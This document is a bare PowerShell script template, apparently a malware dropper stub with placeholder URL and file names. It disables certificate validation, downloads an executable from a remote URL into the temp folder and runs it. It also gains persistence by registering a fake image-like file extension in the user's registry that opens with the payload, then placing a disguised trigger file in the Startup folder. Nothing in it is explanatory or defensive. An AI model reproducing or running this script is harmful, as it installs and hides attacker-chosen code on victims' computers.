[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }

$downloadUrl = '%%url%%'
$tempFolder = $env:TEMP
$exeFileName = '%%filename%%'
$exePath = Join-Path -Path $tempFolder -ChildPath $exeFileName

(New-Object System.Net.WebClient).DownloadFile($downloadUrl, $exePath)

$letters = [char[]]([char]'a'..[char]'z') | Where-Object { $_ -ne 'g' }
$randomLetter = $letters | Get-Random
$extension = ".jp$randomLetter"

$progId = '%%filename2%%'

$regPathOpenCommand = "HKCU:\Software\Classes\$progId\shell\open\command"
New-Item -Path $regPathOpenCommand -Force | Out-Null
Set-ItemProperty -Path $regPathOpenCommand -Name '(Default)' -Value "`"$exePath`" `"%1`"" -Type String

$regPathDefaultIcon = "HKCU:\Software\Classes\$progId\DefaultIcon"
New-Item -Path $regPathDefaultIcon -Force | Out-Null
Set-ItemProperty -Path $regPathDefaultIcon -Name '(Default)' -Value '"C:\Windows\System32\imageres.dll",-72' -Type String

$regPathExtension = "HKCU:\Software\Classes\$extension"
New-Item -Path $regPathExtension -Force | Out-Null
Set-ItemProperty -Path $regPathExtension -Name '(Default)' -Value $progId -Type String

$startupFolder = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
$triggerFileName = "%%filename2%%$extension"
$triggerFilePath = Join-Path -Path $startupFolder -ChildPath $triggerFileName

Copy-Item -Path 'C:\Windows\Web\Screen\img102.jpg' -Destination $triggerFilePath -Force

Start-Process -FilePath $exePath

